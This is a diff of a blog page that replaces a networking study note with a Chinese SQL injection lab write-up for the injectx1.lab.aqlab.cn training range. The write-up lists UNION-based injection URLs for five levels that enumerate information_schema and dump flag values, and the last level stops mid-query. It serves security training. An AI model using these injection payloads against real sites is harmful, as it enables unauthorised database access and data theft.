@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="计算机网络," />
+  <meta name="keywords" content="SQL注入," />
 
 
 
@@ -79,16 +79,16 @@
 
 
 
-<meta name="description" content="计算机网络概述基本概念 计算机网络视通信技术与计算机技术紧密结合的产物，计算机网络就是一种通信网络  计算机网络是互连（互联互通 ——通过通信链路）的、自治（无主从关系）的计算机集合。 注意：当距离很大时通过交换网络互联主机，交换节点（路由器或交换机）">
+<meta name="description" content="掌控公开课——SQL注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content="计算机网络">
-<meta property="og:url" content="http://yoursite.com/2020/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/index.html">
+<meta property="og:title" content="掌控sql注入靶场实践">
+<meta property="og:url" content="http://yoursite.com/2020/06/18/%E6%8E%8C%E6%8E%A7sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/index.html">
 <meta property="og:site_name" content="QuanYex&#39;s Blog">
-<meta property="og:description" content="计算机网络概述基本概念 计算机网络视通信技术与计算机技术紧密结合的产物，计算机网络就是一种通信网络  计算机网络是互连（互联互通 ——通过通信链路）的、自治（无主从关系）的计算机集合。 注意：当距离很大时通过交换网络互联主机，交换节点（路由器或交换机）">
-<meta property="article:published_time" content="2020-06-15T13:48:16.000Z">
-<meta property="article:modified_time" content="2020-06-16T14:25:19.055Z">
+<meta property="og:description" content="掌控公开课——SQL注入">
+<meta property="article:published_time" content="2020-06-17T16:23:48.000Z">
+<meta property="article:modified_time" content="2020-06-17T16:25:33.655Z">
 <meta property="article:author" content="QuanYex">
-<meta property="article:tag" content="计算机网络">
+<meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/06/15/计算机网络/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/06/18/掌控sql注入靶场实践/"/>
 
 
 
 
 
-  <title>计算机网络 | QuanYex's Blog</title>
+  <title>掌控sql注入靶场实践 | QuanYex's Blog</title>
   
 
 
@@ -252,7 +252,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/18/%E6%8E%8C%E6%8E%A7sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="QuanYex">
@@ -269,7 +269,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">计算机网络</h1>
+          <h1 class="post-title" itemprop="name headline">掌控sql注入靶场实践</h1>
         
 
         <div class="post-meta">
@@ -281,8 +281,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-15T21:48:16+08:00">
-                2020-06-15
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-18T00:23:48+08:00">
+                2020-06-18
               </time>
             
 
@@ -297,8 +297,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-06-16T22:25:19+08:00">
-                2020-06-16
+              <time title="更新于" itemprop="dateModified" datetime="2020-06-18T00:25:33+08:00">
+                2020-06-18
               </time>
             
           </span>
@@ -316,8 +316,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">学习</span>
+                  <a href="/categories/%E5%AE%9E%E8%B7%B5/" itemprop="url" rel="index">
+                    <span itemprop="name">实践</span>
                   </a>
                 </span>
 
@@ -353,59 +353,11 @@
       
 
       
-        <h1 id="计算机网络概述"><a href="#计算机网络概述" class="headerlink" title="计算机网络概述"></a>计算机网络概述</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ol>
-<li><p>计算机网络视通信技术与计算机技术紧密结合的产物，计算机网络就是一种通信网络</p>
-</li>
-<li><p>计算机网络是互连（互联互通 ——通过通信链路）的、自治（无主从关系）的计算机集合。</p>
-<p>注意：当距离很大时通过交换网络互联主机，交换节点（路由器或交换机）</p>
-</li>
-</ol>
+        <p>掌控公开课——SQL注入</p>
 <a id="more"></a>
 
-<ol start="3">
-<li><p>internet是全球最大的互联网络,是数以百万计的互连的计算设备集合：</p>
-<p>主机（host）=端系统（end system）</p>
-<p>通信链路：光纤、卫星、铜缆、无线电……</p>
-<p>分组交换：转发分组（数据包） 路由器（routers）和交换机（switches）</p>
-<p>问题：仅有硬件（主机、链路、路由器……）internet能否顺畅运行？能保证数据有序交付吗？</p>
-<p>​                        不能，需要协议。</p>
-</li>
-<li><p>硬件是计算机网络的基础，计算机网络数据交换必须遵守规则，如同交通系统一样，这些规则就是协议。</p>
-</li>
-<li><p>网络协议（network protocol）为进行网络中的数据交换而建立的规则、标准或约定。规定了通信实体之间所交换的消息的格式、意义、顺序以及针对收到信息或发生的事件采取的“动作”</p>
-</li>
-<li><p>协议三要素：</p>
-<p>语法：结构或格式、信号电平    （怎么做）</p>
-<p>语义：需要发出何种控制信息、完成何种动作以及做出何种响 应、差错控制  （做什么）</p>
-<p>时序：时间顺序</p>
-</li>
-<li><p>计算机网络结构：</p>
-<ol>
-<li>网络边缘：主机、网络应用</li>
-<li>接入网络，物理介质：有线或无线通信链路</li>
-<li>网络核心（核心网络）：互联的路由器、网络之网络。</li>
-</ol>
-</li>
-<li><p>网络边缘：</p>
-<p>主机：位于网络边缘、运行网络应用程序</p>
-<p>客户/服务器（client/sever）应用模型：客户发送请求，接收服务器响应</p>
-<p>对等（peer-peer，p2p）应用模型：无（或不依赖）专用服务器、通信在对等实体之间直接进行。如：QQ，Skype</p>
-</li>
-<li><p>接入网络：</p>
-<p>如何将网络边缘介入核心网？</p>
-<p>A：接入网络：住宅（家庭0、机构（学校、企业）、移动接入网络</p>
-<p>​    DSL：数字用户线路（数据通信通过DSL电话线接入Internet） </p>
-<p>​    电缆网络：    和DSL相同采用频分多路复用技术。</p>
-<p>​    HFC：混合光纤同轴电缆。共享电缆头端</p>
-<p>​    无线接入网络：无线局域网、广域无线接入（移动通信）</p>
-</li>
-<li><p>网络核心：</p>
-<p>关键功能：路由+转发。    </p>
-<p>​    路由：确定分组从源到目的的传输路径（路由算法生成本地转发表）</p>
-<p>​    转发：将分组从路由器的输入端口交换至正确的输出端口。通过数据交换实现网络核心从源主机到达目的主机。</p>
-<p>   N²链路问题  主机数为n 没两个主机能连接需要n(n-1)/2，技术很难实现，所以引入了交换设备，为了适应不同的网络规模，所以将交换设备连接成网络。</p>
-</li>
-</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">靶场一：</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1</span><br><span class="line">看到URL id参数，并且知道数据库查询语句是select *from user where id&#x3D;1所以构造</span><br><span class="line">select * from user where id &#x3D;1 and 1 &#x3D; 1 有结果</span><br><span class="line">select * from user where id &#x3D;1 and 1 &#x3D; 2 没结果  判断是注入点</span><br><span class="line">因为之后会用联合查询所以需要判断字段数：构造http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1 order by 1（2...）最后发现order by 4 没有结果 所以字段数是3</span><br><span class="line">尝试去判断当前数据库的名字：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1 and 1 &#x3D; 2 union select database(),version(),1发现数据库名显示不出来，思考id不显示在结果中因此换顺序就可以，得到数据库名 error</span><br><span class="line">尝试去找到当前的表名 http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema &#x3D; &#39;error&#39; limit 0,1(1,1\2,1\3,1)  3,1无结果</span><br><span class="line">		得到表名：error_flag、user、</span><br><span class="line">找字段：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,2,column_name from information_schema.columns where table_name &#x3D; &#39;error_flag&#39; and table_schema &#x3D; &#39;error&#39; limit 0,1（1,1\2,1）2,1无结果</span><br><span class="line">	error 字段 id 、flag    </span><br><span class="line">查flag数据：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-01&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,2,flag from error_flag</span><br><span class="line">	  拿到flag：zKaQ-Nf、zKaQ-BJY、zKaQ-XiaoFang、zKaq-98K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">靶场二：</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-02&#x2F;index.php?id&#x3D;1</span><br><span class="line">数据库查询语句：select *from user where id&#x3D;&#39;1&#39; 因此构造</span><br><span class="line">select * from user where id &#x3D;1&#39; and &#39;1&#39; &#x3D; &#39;1 有结果 或者 select * from user where id &#x3D;1&#39; and 1 &#x3D; 1 -- 这里必须有空格（ ）</span><br><span class="line">select * from user where id &#x3D;1&#39; and &#39;1&#39; &#x3D; &#39;2 无结果 或者 select * from user where id &#x3D;1&#39; and 1 &#x3D; 2 -- 这里必须有空格（ ）所以存在注入点</span><br><span class="line">判断字段数    http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-02&#x2F;index.php?id&#x3D;1 order by 1 -- （2，3，4）所以3个字段数</span><br><span class="line">判断表名：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-02&#x2F;index.php?id&#x3D;&#39;1&#39; and 1&#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema &#x3D; database() -- </span><br><span class="line">	得到表名字 error_flag</span><br><span class="line">bao字段：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-02&#x2F;index.php?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,column_name from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; &#39;error_flag&#39; limit 0,1(1,1) -- </span><br><span class="line">	字段：id&#x2F;flag</span><br><span class="line">查flag数据：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-02&#x2F;index.php?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,flag from error_flag -- </span><br><span class="line">	flag: zKaQ-Nf、zKaQ-BJY、zKaQ-XiaoFang、zKaq-98K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">靶场三：</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-03&#x2F;index.php?id&#x3D;1</span><br><span class="line">数据库查询语句：select *from user where id&#x3D;(&#39;1&#39;) 因此构造</span><br><span class="line">select *from user where id&#x3D;(&#39;1&#39;) and 1&#x3D;1 --  有结果		select *from user where id&#x3D;(&#39;1&#39; and 1&#x3D;1) -- </span><br><span class="line">select *from user where id&#x3D;(&#39;1&#39;) and 1&#x3D;2 --  无结果  是注入点	select *from user where id&#x3D;(&#39;1&#39; and 1&#x3D;2) -- </span><br><span class="line">字段数： http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-03&#x2F;index.php?id&#x3D;1&#39; ) order by 1 (2,3,4)--    字段数为3</span><br><span class="line">表名： http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-03&#x2F;index.php?id&#x3D;1&#39;) and 1&#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema &#x3D; database() --  	error_flag</span><br><span class="line">字段： http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-03&#x2F;index.php?id&#x3D;1&#39;) and 1&#x3D;2 union select 1,2,column_name from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; &#39;error_flag&#39; -- 	id&#x2F;flag</span><br><span class="line">数据： http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-03&#x2F;index.php?id&#x3D;1&#39;) and 1&#x3D;2 union select 1,2,flag from error_flag -- 		flag: zKaQ-Nf、zKaQ-BJY、zKaQ-XiaoFang、zKaq-98K</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">靶场四：</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-04&#x2F;index.php?id&#x3D;1</span><br><span class="line">数据库查询语句：select *from user where id&#x3D;(&quot;1&quot;) 因此构造</span><br><span class="line">select * from user where id &#x3D; (&quot;1&quot;) and 1&#x3D;1 --</span><br><span class="line">select * from user where id &#x3D; (&quot;1&quot;) and 1&#x3D;2 --  可以注入</span><br><span class="line">判断字段数：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-04&#x2F;index.php?id&#x3D;1&quot;) order by 1 --		 3个</span><br><span class="line">表名：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-04&#x2F;index.php?id&#x3D;1&quot;) and 1 &#x3D;2 union select 1,2,table_name from information_schema.tables where table_schema &#x3D; database() --		error_flag</span><br><span class="line">字段：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-04&#x2F;index.php?id&#x3D;1&quot;) and 1 &#x3D;2 union select 1,2,column_name from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; &#39;error_flag&#39; --	flag</span><br><span class="line">数据：http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-04&#x2F;index.php?id&#x3D;1&quot;) and 1 &#x3D;2 union select 1,2,flag from error_flag -- 		flag: zKaQ-Nf、zKaQ-BJY、zKaQ-XiaoFang、zKaq-98K</span><br><span class="line">      </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">靶场五：</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-10&#x2F;index.php?id&#x3D;1</span><br><span class="line">查询语句：select *from news where id&#x3D;1   </span><br><span class="line">select * from user where id &#x3D;1 and 1 &#x3D; 1 有结果</span><br><span class="line">select * from user where id &#x3D;1 and 1 &#x3D; 2 没结果  判断是注入点</span><br><span class="line">构造http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-10&#x2F;index.php?id&#x3D;1 order by 1（2...）  字段数2</span><br><span class="line">http:&#x2F;&#x2F;injectx1.lab.aqlab.cn:81&#x2F;Pass-10&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,length(str)table_name from information_schema.tables where table_schema &#x3D; database() limit 0,1</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -423,7 +375,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag"># 计算机网络</a>
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
           
         </div>
       
@@ -436,8 +388,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/06/10/%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%B1%87%E6%80%BB/" rel="next" title="任意密码重置汇总">
-                <i class="fa fa-chevron-left"></i> 任意密码重置汇总
+              <a href="/2020/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="next" title="计算机网络">
+                <i class="fa fa-chevron-left"></i> 计算机网络
               </a>
             
           </div>
@@ -445,10 +397,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/06/18/%E6%8E%8C%E6%8E%A7sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E8%B7%B5/" rel="prev" title="掌控sql注入靶场实践">
-                掌控sql注入靶场实践 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -500,17 +448,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -574,22 +513,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#计算机网络概述"><span class="nav-number">1.</span> <span class="nav-text">计算机网络概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本概念"><span class="nav-number">1.1.</span> <span class="nav-text">基本概念</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
